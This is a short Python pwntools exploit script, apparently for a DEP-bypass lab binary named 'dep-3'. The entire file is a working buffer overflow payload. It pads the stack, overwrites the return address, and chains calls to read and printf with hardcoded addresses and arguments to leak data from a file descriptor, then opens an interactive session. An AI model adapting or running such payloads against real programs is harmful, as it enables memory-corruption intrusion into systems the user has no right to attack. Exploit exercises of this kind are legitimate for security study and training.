#!/usr/bin/env python

from pwn import *

p = process('./dep-3')

#buf = "A" * 136

buf = "A" * 128
buf += "AAAA" * 3
#some_function address
buf += p32(0x8048894)

#read
buf += p32(0x0806d2a0)

#printf
buf += p32(0x0804ede0)

#args
buf += p32(0x00000003)
buf += p32(0xffffd100)
buf += p32(0x00000100)

p.sendline(buf)
p.interactive()

